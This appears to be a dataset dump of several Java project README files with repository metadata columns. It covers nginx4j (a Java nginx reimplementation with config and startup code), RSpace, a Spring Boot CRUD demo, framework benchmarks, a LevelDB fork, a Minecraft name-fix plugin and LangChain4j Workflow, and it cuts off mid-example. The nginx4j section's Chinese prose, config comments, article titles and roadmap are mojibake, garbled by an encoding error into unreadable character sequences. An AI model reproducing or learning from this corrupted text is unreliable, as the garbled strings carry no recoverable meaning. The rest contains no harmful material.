- cookie çš„æ“ä½œå¤„ç† proxy_cookie_domain/proxy_cookie_flags/proxy_cookie_path å†…ç½®æ”¯æŒ 

- proxy_pass åå‘ä»£ç†å®ç°

# å˜æ›´æ—¥å¿—

> [å˜æ›´æ—¥å¿—](CHANGE_LOG.md)

# å¿«é€Ÿå¼€å§‹

## maven ä¾èµ–

```xml
<dependency>
    <groupId>com.github.houbb</groupId>
    <artifactId>nginx4j</artifactId>
    <version>0.27.0</version>
</dependency>
```

## å¯åŠ¨æµ‹è¯•

### é…ç½®æ–‡ä»¶

```conf
# nginx.conf

# å®šä¹‰è¿è¡ŒNginxçš„ç”¨æˆ·å’Œç»„
user nginx;

# ä¸»è¿›ç¨‹çš„PIDæ–‡ä»¶å­˜æ”¾ä½ç½®
pid /var/run/nginx.pid;

# äº‹ä»¶æ¨¡å—é…ç½®
events {
    worker_connections 1024;  # æ¯ä¸ªå·¥ä½œè¿›ç¨‹çš„æœ€å¤§è¿æ¥æ•°
}

# HTTPæ¨¡å—é…ç½®
http {
    include /etc/nginx/mime.types;  # MIMEç±»å‹é…ç½®æ–‡ä»¶
    default_type application/octet-stream;  # é»˜è®¤çš„MIMEç±»å‹

    # æ–‡ä»¶ä¼ è¾“è®¾ç½®
    sendfile on;  # å¼€å¯é«˜æ•ˆæ–‡ä»¶ä¼ è¾“
    # Keepaliveè¶…æ—¶è®¾ç½®
    keepalive_timeout 65;

    # å®šä¹‰æœåŠ¡å™¨å—
    server {
        listen 8080;
        server_name 192.168.1.12:8080;  # æœåŠ¡å™¨åŸŸå

        # å•ç‹¬ä¸ºè¿™ä¸ª server å¯ç”¨ sendfile
        sendfile on;

        # é™æ€æ–‡ä»¶çš„æ ¹ç›®å½•
        root D:\data\nginx4j;  # é™æ€æ–‡ä»¶å­˜æ”¾çš„æ ¹ç›®å½•
        index index.html index.htm;  # é»˜è®¤é¦–é¡µ

        # å¦‚æœéœ€è¦ä¸ºè¿™ä¸ª server å•ç‹¬é…ç½® gzipï¼Œå¯ä»¥è¦†ç›–å…¨å±€é…ç½®
        gzip on;
        gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;

        # é»˜è®¤åŒ¹é…
        location / {
            proxy_set_header X-DEFINE-PARAM myDefineParam;
            proxy_set_header X-DEFINE-HOST 127.0.0.1;

            # å¢åŠ æˆ–ä¿®æ”¹å“åº”å¤´ è¿™é‡Œå°±æç°äº†ä¸€äº›å ä½ç¬¦çš„å¼ºå¤§ä¹‹å¤„ã€‚ä¸‹ä¸€æ¬¡å¯ä»¥è€ƒè™‘æ”¯æŒ
            add_header X-Response-Time 2024-06-08;

            # åˆ é™¤å“åº”å¤´
            proxy_hide_header X-Unwanted-Header;

            # å ä½ç¬¦æµ‹è¯• v0.17.0
            set $myVal 1000;
            add_header X-MY-VAL $myVal;
            add_header X-MY-HOST $host;
        }
    }

    # å®šä¹‰æœåŠ¡å™¨å—2
    server {
        listen 8081;
        server_name 192.168.1.12:8081;  # æœåŠ¡å™¨åŸŸå

        # å•ç‹¬ä¸ºè¿™ä¸ª server å¯ç”¨ sendfile
        sendfile on;

        # é™æ€æ–‡ä»¶çš„æ ¹ç›®å½•
        root D:\data\nginx4j;  # é™æ€æ–‡ä»¶å­˜æ”¾çš„æ ¹ç›®å½•
        index index.txt; # é»˜è®¤é¦–é¡µ

        # é»˜è®¤åŒ¹é…
        location / {
            proxy_set_header X-DEFINE-PARAM myDefineParam;
            proxy_set_header X-DEFINE-HOST 127.0.0.2;

            # å¢åŠ æˆ–ä¿®æ”¹å“åº”å¤´ è¿™é‡Œå°±æç°äº†ä¸€äº›å ä½ç¬¦çš„å¼ºå¤§ä¹‹å¤„ã€‚ä¸‹ä¸€æ¬¡å¯ä»¥è€ƒè™‘æ”¯æŒ
            add_header X-Response-Time 2024-06-09;

            # åˆ é™¤å“åº”å¤´
            proxy_hide_header X-Unwanted-Header;
        }
    }

}
```


### å¯åŠ¨ä»£ç 

```java
// æŒ‡å®šé…ç½®æ–‡ä»¶çš„ä½ç½®
NginxUserConfig nginxUserConfig = NginxUserConfigLoaders.configFile(""D:\\github\\nginx4j\\src\\main\\resources\\nginx.conf"").load();

Nginx4jBs.newInstance()
.nginxUserConfig(nginxUserConfig)
.init()
.start();
```

å¯åŠ¨æ—¥å¿—ï¼š

```
[DEBUG] [2024-05-24 23:40:37.573] [main] [c.g.h.l.i.c.LogFactory.setImplementation] - Logging initialized using 'class com.github.houbb.log.integration.adaptors.stdout.StdOutExImpl' adapter.
[INFO] [2024-05-24 23:40:37.576] [main] [c.g.h.n.s.s.NginxServerSocket.start] - [Nginx4j] listen on port=8080
```

é¡µé¢è®¿é—®ï¼š[http://127.0.0.1:8080](http://127.0.0.1:8080)

å“åº”ï¼š

```
Welcome to nginx4j!
```

## å…¶ä»–é¡µé¢

è®¿é—® [http://localhost:8080/1.txt](http://localhost:8080/1.txt)

å°†è¿”å›å¯¹åº”çš„æ–‡ä»¶å†…å®¹ï¼š

```
hello nginx4j!
```

## ä¸å­˜åœ¨

http://localhost:8080/asdfasdf

è¿”å›ï¼š

```
404 Not Found: The requested resource was not found on this server.
```

## gzip

```java
NginxUserConfig nginxUserConfig = NginxUserConfigLoaders.configFile(""D:\\github\\nginx4j\\src\\main\\resources\\nginx.conf"").load();

 Nginx4jBs.newInstance()
 .nginxUserConfig(nginxUserConfig)
 .init()
 .start();
```

å¯ä»¥å¼€å¯ gzip çš„å¤„ç†ã€‚

## æ‹“å±•é˜…è¯»

[ä»é›¶æ‰‹å†™å®ç° nginx-01-ä¸ºä»€ä¹ˆä¸èƒ½æœ‰ java ç‰ˆæœ¬çš„ nginx?](https://houbb.github.io/2018/11/22/nginx-write-01-how-to)

[ä»é›¶æ‰‹å†™å®ç° nginx-02-nginx çš„æ ¸å¿ƒèƒ½åŠ›](https://houbb.github.io/2018/11/22/nginx-write-02-basic-http)

[ä»é›¶æ‰‹å†™å®ç° nginx-03-nginx åŸºäº Netty å®ç°](https://houbb.github.io/2018/11/22/nginx-write-03-basic-http-netty)

[ä»é›¶æ‰‹å†™å®ç° nginx-04-åŸºäº netty http å‡ºå…¥å‚ä¼˜åŒ–å¤„ç†](https://houbb.github.io/2018/11/22/nginx-write-04-netty-http-optimize)

[ä»é›¶æ‰‹å†™å®ç° nginx-05-MIMEç±»å‹ï¼ˆMultipurpose Internet Mail Extensionsï¼Œå¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ï¼‰](https://houbb.github.io/2018/11/22/nginx-write-05-mime-type)

[ä»é›¶æ‰‹å†™å®ç° nginx-06-æ–‡ä»¶å¤¹è‡ªåŠ¨ç´¢å¼•](https://houbb.github.io/2018/11/22/nginx-write-06-dir-list)

[ä»é›¶æ‰‹å†™å®ç° nginx-07-å¤§æ–‡ä»¶ä¸‹è½½](https://houbb.github.io/2018/11/22/nginx-write-07-big-file)

[ä»é›¶æ‰‹å†™å®ç° nginx-08-èŒƒå›´æŸ¥è¯¢](https://houbb.github.io/2018/11/22/nginx-write-08-range)

[ä»é›¶æ‰‹å†™å®ç° nginx-09-æ–‡ä»¶å‹ç¼©](https://houbb.github.io/2018/11/22/nginx-write-09-comparess)

[ä»é›¶æ‰‹å†™å®ç° nginx-10-sendfile é›¶æ‹·è´](https://houbb.github.io/2018/11/22/nginx-write-10-sendfile)

[ä»é›¶æ‰‹å†™å®ç° nginx-11-file+range åˆå¹¶](https://houbb.github.io/2018/11/22/nginx-write-11-file-and-range-merge)

[ä»é›¶æ‰‹å†™å®ç° nginx-12-keep-alive è¿æ¥å¤ç”¨](https://houbb.github.io/2018/11/22/nginx-write-12-keepalive)

[ä»é›¶æ‰‹å†™å®ç° nginx-13-nginx.conf é…ç½®æ–‡ä»¶ä»‹ç»](https://houbb.github.io/2018/11/22/nginx-write-13-nginx-conf-intro)

[ä»é›¶æ‰‹å†™å®ç° nginx-14-nginx.conf å’Œ hocon æ ¼å¼æœ‰å…³ç³»å—ï¼Ÿ](https://houbb.github.io/2018/11/22/nginx-write-14-nginx-conf-hocon)

[ä»é›¶æ‰‹å†™å®ç° nginx-15-nginx.conf å¦‚ä½•é€šè¿‡ java è§£æå¤„ç†ï¼Ÿ](https://houbb.github.io/2018/11/22/nginx-write-15-nginx-conf-parser)

[ä»é›¶æ‰‹å†™å®ç° nginx-16-nginx æ”¯æŒé…ç½®å¤šä¸ª server](https://houbb.github.io/2018/11/22/nginx-write-16-nginx-conf-multi-server)

[ä»é›¶æ‰‹å†™å®ç° nginx-17-nginx é»˜è®¤é…ç½®ä¼˜åŒ–](https://houbb.github.io/2018/11/22/nginx-write-17-nginx-conf-global-default)

[ä»é›¶æ‰‹å†™å®ç° nginx-18-nginx è¯·æ±‚å¤´+å“åº”å¤´æ“ä½œ](https://houbb.github.io/2018/11/22/nginx-write-18-nginx-conf-header-oper)

[ä»é›¶æ‰‹å†™å®ç° nginx-19-nginx cors](https://houbb.github.io/2018/11/22/nginx-write-19-cors)

[ä»é›¶æ‰‹å†™å®ç° nginx-20-nginx å ä½ç¬¦ placeholder](https://houbb.github.io/2018/11/22/nginx-write-20-placeholder)

[ä»é›¶æ‰‹å†™å®ç° nginx-21-nginx modules æ¨¡å—ä¿¡æ¯æ¦‚è§ˆ](https://houbb.github.io/2018/11/22/nginx-write-21-modules-overview)

[ä»é›¶æ‰‹å†™å®ç° nginx-22-nginx modules åˆ†æ¨¡å—åŠ è½½ä¼˜åŒ–](https://houbb.github.io/2018/11/22/nginx-write-22-modules-load)

[ä»é›¶æ‰‹å†™å®ç° nginx-23-nginx cookie çš„æ“ä½œå¤„ç†](https://houbb.github.io/2018/11/22/nginx-write-23-cookie-oper)

[ä»é›¶æ‰‹å†™å®ç° nginx-24-nginx IF æŒ‡ä»¤](https://houbb.github.io/2018/11/22/nginx-write-24-directives-if)

[ä»é›¶æ‰‹å†™å®ç° nginx-25-nginx map æŒ‡ä»¤](https://houbb.github.io/2018/11/22/nginx-write-25-directives-map)

[ä»é›¶æ‰‹å†™å®ç° nginx-26-nginx rewrite æŒ‡ä»¤](https://houbb.github.io/2018/11/22/nginx-write-26-directives-rewrite)

[ä»é›¶æ‰‹å†™å®ç° nginx-27-nginx return æŒ‡ä»¤](https://houbb.github.io/2018/11/22/nginx-write-27-directives-return)

[ä»é›¶æ‰‹å†™å®ç° nginx-28-nginx error_pages æŒ‡ä»¤](https://houbb.github.io/2018/11/22/nginx-write-28-directives-error-pages)

[ä»é›¶æ‰‹å†™å®ç° nginx-29-nginx try_files æŒ‡ä»¤](https://houbb.github.io/2018/11/22/nginx-write-29-directives-try_files)

[ä»é›¶æ‰‹å†™å®ç° nginx-30-nginx proxy_pass upstream æŒ‡ä»¤](https://houbb.github.io/2018/11/22/nginx-write-30-proxy-pass)

[ä»é›¶æ‰‹å†™å®ç° nginx-31-nginx load-balance è´Ÿè½½å‡è¡¡](https://houbb.github.io/2018/11/22/nginx-write-31-load-balance)

[ä»é›¶æ‰‹å†™å®ç° nginx-32-nginx load-balance ç®—æ³• java å®ç°](https://houbb.github.io/2018/11/22/nginx-write-32-load-balance-java-impl)

[ä»é›¶æ‰‹å†™å®ç° nginx-33-nginx http proxy_pass æµ‹è¯•éªŒè¯](https://houbb.github.io/2018/11/22/nginx-write-33-http-proxy-pass-test)

[ä»é›¶æ‰‹å†™å®ç° nginx-34-proxy_pass é…ç½®åŠ è½½å¤„ç†](https://houbb.github.io/2018/11/22/nginx-write-34-http-proxy-pass-config-load)

[ä»é›¶æ‰‹å†™å®ç° nginx-35-proxy_pass netty å¦‚ä½•å®ç°ï¼Ÿ](https://houbb.github.io/2018/11/22/nginx-write-35-http-proxy-pass-netty)

# ROAD-MAP

## static

- [x] åŸºäº netty å®ç°
- [x] index.html
- [x] 404 403 ç­‰å¸¸è§é¡µé¢
- [x] åŸºäº netty çš„è¯·æ±‚/å“åº”å°è£…
- [x] å„ç§æ–‡ä»¶ç±»å‹çš„è¯·æ±‚å¤´å¤„ç†
- [x] æ–‡ä»¶å¤¹çš„è‡ªåŠ¨ç´¢å¼•
- [x] å¤§æ–‡ä»¶çš„åˆ†æ®µä¼ è¾“ï¼Ÿchunk
- [x] range èŒƒå›´è¯·æ±‚
- [x] è¯·æ±‚çš„å‹ç¼© gzip ç­‰å¸¸è§å‹ç¼©ç®—æ³•
- [x] sendFile ç‰¹æ€§æ”¯æŒ
- [x] range çš„ä»£ç åˆå¹¶åˆ° file
- [x] http keep-alive
- [x] é…ç½®çš„æ ‡å‡† POJO
- [x] nginx.conf çš„è§£æ=ã€‹POJO
- [x] http å…¨å±€çš„é»˜è®¤é…ç½®å±æ€§
- [x] è¯·æ±‚å¤´ä¿¡æ¯é‡å†™
- [x] CORS è¿™ä¸ªè¿˜æ˜¯è®©ç”¨æˆ·å¤„ç†ï¼Œä¸è¿‡å¯ä»¥å•ç‹¬å†™ä¸€ç¯‡æ–‡ç« 
- [x] $ å ä½ç¬¦çš„å®ç°
- [x] å¸¸è§ cookie çš„å¤„ç†
- [x] if æŒ‡ä»¤çš„æ”¯æŒ
- [x] map å˜é‡ä¿®æ”¹æŒ‡ä»¤
- [x] rewrite æŒ‡ä»¤ï¼Œé‡å†™ URL
- [x] return è¿”å›æŒ‡ä»¤
- [x] error_page è‡ªå®šä¹‰é”™è¯¯é¡µé¢
- [x] try_files æ–‡ä»¶å¤„ç†æŒ‡ä»¤
- [ ] æ›´å¤š directive æŒ‡ä»¤å®ç°
- [ ] æ›´å¤šæ–‡ä»¶æ ¼å¼çš„å†…ç½®æ”¯æŒï¼Ÿ
- [ ] ETag å’Œ Last-Modified + cache ç›¸å…³
- [ ] å‹ç¼©æ›´å¥½çš„å®ç°æ–¹å¼ï¼Ÿ zlib ç®—æ³• + å®ç°ä¼˜åŒ–ï¼Ÿ
- [ ] http2
- [ ] http3
- [ ] ssl/https
- [ ] å®‰å…¨ è®¿é—®é™åˆ¶

## åå‘ä»£ç†

- [x] reverse-proxy
- [x] load-balance

## system

- [ ] cache
- [ ] rateLimit é™æµ
- [ ] filter è¿‡æ»¤å™¨
- [ ] listener ç›‘å¬å™¨
",0,2,28,0.0,"['maven', 'server', 'sendfile', 'server', 'server', 'sendfile', 'gzip', 'static', 'system']","['server', 'sendfile', 'maven', 'gzip', 'static']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.codehaus.mojo:cobertura-maven-plugin,org.eluder.coveralls:coveralls-maven-plugin]",0.0,1.0,0.0
rspace-os/rspace-web,main,"# ğŸ‘‹ Welcome to RSpace 
<picture>
 <img alt=""Map of how the RSpace platform creates an ecosystem of digital tools to support workflows for preparing, conducting and reporting on research."" src=""https://github.com/rspace-os/rspace-marketing-resources/blob/217a4cbd3d50a1e7cc82020b3a8e69915d7b13df/main_graphic.png"" width = 400 align = right>
</picture>
RSpace is an open-source collaborative research data management platform that interoperates with many tools and services researchers and their research organizations already use. It is designed to enable frictionless workflows when researchers plan their research, record experimental data, keep track of physical samples, manage their digital research objects, report on their work and share it with their communities. 

<br clear=""right""/>

# ğŸš§ Construction ahead!
Thank you for your interest in the RSpace open-source project! We're excited to have you here!
[Releasing RSpace as an open-source project](http://www.researchspace.com/blog/research-space-embraces-open-source-to-empower-fair-data-workflows) is huge step for us and we likely won't have everything as polished as we'd like it to be in the beginning. Please bear with us as we're taking one step at a time to build an inclusive and efficient contributor experience. If you have any questions, concerns, or ideas how we can improve, don't hesitate to reach out to us ğŸ™.

# About the RSpace open-source project
ğŸ—ºï¸ You are currently on the main repository for building RSpace
- The RSpace open-source project maintained by [Research Space](https://www.researchspace.com).
- ğŸš§ The central hub for project and community related information is the [Wiki](https://github.com/rspace-os/rspace-web/wiki/) located on this repository.
  
## Getting started
- Please make sure you've read and understood our [code of conduct](https://github.com/rspace-os/.github/blob/1be658989ec362844d1f8b2ef590f28bbc989a1e/CODE_OF_CONDUCT.md) for maintaining an inclusive and productive community.
- A good starting point to learn about RSpace, its features, and integrations with third party services is the [documentation](https://documentation.researchspace.com/).
- Please read our [contributor information](https://github.com/rspace-os/.github/blob/1be658989ec362844d1f8b2ef590f28bbc989a1e/CONTRIBUTING.md) for a general overview on how to contribute to this project.
- Developer documentation can be found [here](DevDocs/DeveloperNotes/GettingStarted/GettingStarted.md).

## Running RSpace via docker
- Information on how to run RSpace via docker can be found in the [rspace-docker repository](https://github.com/rspace-os/rspace-docker).

# Getting in touch
- Various ways of connecting and communicating with the RSpace open source project can be found on this [wiki page](https://github.com/rspace-os/rspace-web/wiki/Contact).
- For inquiries about Research Space's enterprise solutions, please visit the Research Space website [here](https://www.researchspace.com/pricing).
",6,18,2,115.0,"['welcome', 'rspace', 'construction', 'ahead', 'about', 'rspace', 'project', 'get', 'start', 'run', 'rspace', 'via', 'docker', 'get', 'touch']","['rspace', 'get', 'welcome', 'construction', 'ahead']",1.0,"[com.diffplug.spotless:spotless-maven-plugin,com.github.eirslett:frontend-maven-plugin,com.github.spotbugs:spotbugs-maven-plugin,com.ruleoftech:markdown-page-generator-plugin,de.juplo:hibernate4-maven-plugin,maven-clean-plugin,org.apache.maven.plugins:maven-antrun-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.apache.maven.plugins:maven-toolchains-plugin,org.apache.maven.plugins:maven-war-plugin,org.codehaus.mojo:sql-maven-plugin,org.eclipse.jetty:jetty-maven-plugin,org.jacoco:jacoco-maven-plugin,org.liquibase:liquibase-maven-plugin,org.sonarsource.scanner.maven:sonar-maven-plugin]",1.0,0.0,0.0
jaiswaladi246/Mission,main,"# Spy App

**Java-based Full-Stack Web Application.** Users can view or create missions for each agents. They can also edit/ delete missions.

## Technologies

- Java
- Spring Boot
- JDBC
- H2 Database
- Thymeleaf
- HTML5
- Maven

## Features

- CRUD operations
- JDBC for database control
- Spring Boot framework
- Mapping HTTP requests to appropriate HTML pages on the controller
- Sharing model attributes between the controller and HTML files using Thymeleaf
- Customizing schema using schema.sql file
- Inserting initial data using data.sql file

## How to Run

1. Clone the repository
2. Open the project in your IDE of choice
3. Run the application
",0,0,1,0.0,"['spy', 'app', 'technology', 'feature', 'how', 'run']","['spy', 'app', 'technology', 'feature', 'how']",1.0,"[org.jacoco:jacoco-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
ivangfr/web-reactive-jvm-native-cds-aot-virtual-threads,main,"# web-reactive-jvm-native-cds-aot-virtual-threads

In this project, we will create six applications using [`Spring Boot`](https://docs.spring.io/spring-boot/index.html), [`Quarkus`](https://quarkus.io/), and [`Micronaut`](https://micronaut.io/) frameworks.

For each framework, we will implement one app with traditional blocking `Web` using `Apache Tomcat` and another app with non-blocking `Reactive` using `Netty`. We will also build both `JVM` and `Native` Docker images for the applications.

For the `Spring Boot` apps, we will build additional Docker images with different configurations, including enabling or not some Java optimizations like `Virtual Threads` ([`JEP 444`](https://openjdk.org/jeps/444)), `CDS` ([`JEP 310`](https://openjdk.org/jeps/310)), and `AOT` ([`JEP 295`](https://openjdk.org/jeps/295)).

## Proof-of-Concepts & Articles

On [ivangfr.github.io](https://ivangfr.github.io), I have compiled my Proof-of-Concepts (PoCs) and articles. You can easily search for the technology you are interested in by using the filter. Who knows, perhaps I have already implemented a PoC or written an article about what you are looking for.

## Additional Readings

### Spring Boot Performance Benchmark

- \[**Medium**\] [**Spring Boot Performance Benchmark: Web, Reactive, CDS, AOT, Virtual Threads, JVM, and Native**](https://medium.com/@ivangfr/spring-boot-performance-benchmark-web-reactive-cds-aot-virtual-threads-jvm-and-native-29295c8099b0)
- \[**Medium**\] [**Spring Boot 3.3.2 Benchmark: Web, Reactive, CDS, AOT, Virtual Threads, JVM, and Native**](https://medium.com/@ivangfr/spring-boot-3-3-2-benchmark-web-reactive-cds-aot-virtual-threads-jvm-and-native-42d3b704e88e)

### Java Frameworks Performance Benchmark

- \[**Medium**\] [**Java Frameworks Performance Benchmark: Spring Boot vs. Quarkus vs. Micronaut**](https://medium.com/@ivangfr/java-frameworks-performance-benchmark-spring-boot-vs-quarkus-vs-micronaut-028b6dbfef2e)
- \[**Medium**\] [**Performance Benchmark: Spring Boot 3.3.2 vs. Quarkus 3.13.2 vs. Micronaut 4.5.1**](https://medium.com/@ivangfr/performance-benchmark-spring-boot-3-3-2-vs-quarkus-3-13-2-vs-micronaut-4-5-1-515bae82d04f)

## Applications

- ### [spring-boot-greetings-api-web](https://github.com/ivangfr/web-reactive-jvm-native-cds-aot-virtual-threads/tree/main/spring-boot-greetings-api-web)
- ### [spring-boot-greetings-api-rective](https://github.com/ivangfr/web-reactive-jvm-native-cds-aot-virtual-threads/tree/main/spring-boot-greetings-api-reactive)
- ### [quarkus-greetings-api-web](https://github.com/ivangfr/web-reactive-jvm-native-cds-aot-virtual-threads/tree/main/quarkus-greetings-api-web)
- ### [quarkus-greetings-api-rective](https://github.com/ivangfr/web-reactive-jvm-native-cds-aot-virtual-threads/tree/main/quarkus-greetings-api-reactive)
- ### [micronaut-greetings-api-web](https://github.com/ivangfr/web-reactive-jvm-native-cds-aot-virtual-threads/tree/main/micronaut-greetings-api-web)
- ### [micronaut-greetings-api-rective](https://github.com/ivangfr/web-reactive-jvm-native-cds-aot-virtual-threads/tree/main/micronaut-greetings-api-reactive)

## Latest Framework Version Used

| Framework   | Version |
|-------------|---------|
| Quarkus     | 3.12.2  |
| Micronaut   | 4.5.1   |
| Spring Boot | 3.3.2   |

## Prerequisites

- [`Java 21+`](https://www.oracle.com/java/technologies/downloads/#java21)
- [`Docker`](https://www.docker.com/)

## Docker Images

The application's JVM and native Docker images can be found at [this Docker Hub link](https://hub.docker.com/u/ivanfranchin).

## Bash scripts

- **docker-build-spring-boot.sh**: this script builds Spring Boot Docker images
- **docker-build-quarkus.sh**: this script builds Quarkus Docker images
- **docker-build-micronaut.sh**: this script builds Micronaut Docker images
- **remove-docker-images.sh**: this script removes all Docker images
",0,0,1,0.0,"['article', 'additional', 'reading', 'spring', 'boot', 'performance', 'benchmark', 'java', 'framework', 'performance', 'benchmark', 'application', 'https', 'https', 'https', 'https', 'https', 'https', 'latest', 'framework', 'version', 'use', 'prerequisite', 'docker', 'image', 'bash', 'script']","['https', 'performance', 'benchmark', 'framework', 'article']",6.0,"[${quarkus.platform.group-id}:quarkus-maven-plugin,io.micronaut.maven:micronaut-maven-plugin,maven-compiler-plugin,maven-failsafe-plugin,maven-surefire-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.graalvm.buildtools:native-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,4.0,0.0
HiveGamesOSS/leveldb-mcpe-java,main,"# LevelDB MCPE in Java

This project is a fork of https://github.com/pcmind/leveldb aiming to implement the changes made
in https://github.com/Mojang/leveldb-mcpe/ where relevant to allow the library to read MCPE.

For more information see the original repository on use cases / API usage.

Building
--------

**Requirements**

- Git
- Java 11 or higher
- Maven

**Steps**

1. Clone this repository via `git clone git://github.com/HiveGamesOSS/leveldb-mcpe-java.git`.
2. Build the project via `mvn clean install`.
3. Obtain the library from `target/` folder.

Library Usage
--------

You can use the following in your maven pom.xml:

```xml

<dependency>
    <groupId>com.hivemc.leveldb</groupId>
    <artifactId>leveldb</artifactId>
    <version>1.0.0</version>
</dependency>
```

```xml

<dependency>
    <groupId>com.hivemc.leveldb</groupId>
    <artifactId>leveldb-api</artifactId>
    <version>1.0.0</version>
</dependency>
```

This library is aimed as a drop in replacement to the original fork https://github.com/pcmind/leveldb.

License
--------

Details of the LICENSE can be found in the license.txt, this fork maintains the original license for all code and
modifications.
",2,0,1,0.0,"['leveldb', 'mcpe', 'java']","['leveldb', 'mcpe', 'java']",5.0,"[maven-compiler-plugin,maven-shade-plugin,maven-surefire-plugin,org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:exec-maven-plugin,org.eluder.coveralls:coveralls-maven-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,4.0,1.0
egecanakincioglu/name-fix-plugin,main,"# ğŸ’¡ CartelNameFix Java Minecraft Plugin

## ğŸ› ï¸ What Does This Plugin Do?

This plugin is designed to prevent players from exploiting permission or account bugs to disrupt the economic or authority balance of the server. When players join the server with the name ""Cartel,"" this name is recorded in a MySQL database. After being registered, permission matching is done in the tables, associating the name with the permissions of the player. Some plugins, due to certain bugs, mistakenly apply the permissions of the ""Cartel"" account to anyone trying to enter the game with the name ""cartel."" This system solves that issue precisely.

## ğŸš€ How Does This Plugin Solve the Problem?

The issue arises from various plugins or vulnerabilities in older Minecraft versions. This plugin addresses it by creating an SQL database to control connection requests of players joining the game based on the data in the SQL. If such an account does not exist in the plugin's SQL, it will be created, and default permissions will be assigned to the newly created accounts. Subsequently, if administrators assign you administrative permissions in the game, it will be updated in the database as well. In short, if there's an account named ""Cartel,"" you can no longer create an account with the name ""cartel.""

## ğŸ› ï¸ What's Needed for Installation?

Currently, it doesn't depend on any other plugin, so it will work by simply placing the CartelNameFix.jar file into the ./plugins directory. However, for clarification:

- Navigate to the ./plugins directory of your server and drag the CartelNameFix.jar file into it.
- Start your server and monitor the console. You'll see informative messages indicating the plugin has been loaded.
- If the plugin loads successfully, it will create a file and an associated database file. All name data for your server will be stored here.
- This way, you'll be free from all name bugs.

For further information, feel free to contact me. You can also support me in future projects by checking out my GitHub profile and reaching out to me through the provided channels.
",0,0,1,0.0,"['cartelnamefix', 'java', 'minecraft', 'plugin', 'what', 'do', 'this', 'plugin', 'do', 'how', 'doe', 'this', 'plugin', 'solve', 'problem', 'what', 'need', 'installation']","['plugin', 'what', 'do', 'this', 'cartelnamefix']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,1.0,0.0
czelabueno/langchain4j-workflow,main,"# LangChain4j Workflow ğŸ¦œğŸ”€

Build advanced java applications with AI based on flexible stateful workflows ğŸ’¡

## Overview
LangChain4j Workflow is a dynamic, stateful workflow engine crafted as a Java library, drawing inspiration from graph network libraries. It empowers developers with granular control over the flow and state of their applications. This engine is a game-changer for building sophisticated AI applications, such as RAG-based approaches using modern paradigms and agent architectures, where the application's flow and state are pivotal. It enables the crafting of custom behavior, leading to a significant reduction in hallucinations and an increase in response reliability

LangChain4j Workflow is influenced by [LangGraph](https://langchain-ai.github.io/langgraph/tutorials/introduction/), [Graphviz](https://graphviz.gitlab.io/Gallery/directed/) and [Apache Beam](https://beam.apache.org/), and it offers a multitude of benefits. It allows you to define custom workflows as a graph, iteratively, with cycles, flexibility, control, and conditional decisions. These benefits are indispensable for building advanced AI applications.

LangChain4j Workflow is designed to integrate seamlessly with [LangChain4j](https://docs.langchain4j.dev/), enabling you to define custom workflows using all the features that LangChain4j offers. This integration could provide a comprehensive toolset for building advanced AI applications.

> ğŸŒŸ **Starring me**: If you find this repository beneficial, don't forget to give it a star! ğŸŒŸ Your support increases its chances of being merged with the LangChain4j codebase. It's a simple way to show your appreciation and help this project grow!

## Key Features
- **Stateful**: LangChain4j Workflow is a stateful engine, enabling you to design custom states as POJO and transitions. This feature provides a robust foundation for managing the flow and state of your application.
- **Graph-Based**: The workflow is graph-based, offering the flexibility to define custom workflows with multiple directions such as one-way, round trip, cyclic, and more. This feature allows for intricate control over the flow of your application.
- **Flexible**: LangChain4j Workflow is designed with flexibility in mind. You can define custom workflows and append them at any point in other RAG paradigms, such as Modular RAG. This flexibility allows for a high degree of customization.
- **Iterative**: The engine supports the implementation of loops and conditionals in your custom workflows. This feature allows for complex logic and flow control within your workflows.
- **Streaming Support**: LangChain4j Workflow supports streaming outputs as they are produced by each node. This feature allows for real-time processing and response in your application.
- **Integration**: LangChain4j Workflow is designed to integrate seamlessly with [LangChain4j](https://docs.langchain4j.dev/), enabling you to define custom workflows using all the features that LangChain4j offers. This integration provides a comprehensive toolset for building advanced AI applications.
- **Visualization**: The engine supports the generation of workflow images. This feature allows you to visualize the flow computed of your app workflow. By Default it uses `Graphhviz` lib to generate the image, but you implement your own image generator on `GraphImageGenerator.java` interface.

## Installation
```shell
mvn clean package install
```
## Example
In **LangChain4j Workflow**, the notion of state plays a pivotal role. Every execution of the graph initiates a state, which is then transferred among the nodes during their execution. Each node, after its execution, updates this internal state with its own return value. The method by which the graph updates its internal state is determined by user-defined functions.

Add the following dependency to your `pom.xml` file:
```xml
<dependency>
  <groupId>dev.langchain4j</groupId>
  <artifactId>langchain4j-workflow</artifactId>
  <version>0.1.0</version> <!--Change to the latest version-->
</dependency>
```
Define a stateful bean with fields that will be used to store the state of the workflow:
```java
// Define a stateful bean
public class MyStatefulBean {
  int value = 0;
}
```

Create a simple workflow with 4 nodes and conditional edges:
```java
public class Example {
  public static void main(String[] args) {
    
    MyStatefulBean myStatefulBean = new MyStatefulBean();

    // Define functions that determines statefulBean state
    Function<MyStatefulBean, String> node1Func = obj -> {
      obj.value +=1;
      System.out.println(""Node 1: ["" + obj.value + ""]"");
      return ""Node1: function proceed"";
    };
    Function<MyStatefulBean, String> node2Func = obj -> {
      obj.value +=2;
      System.out.println(""Node 2: ["" + obj.value + ""]"");
      return ""Node2: function proceed"";
    };
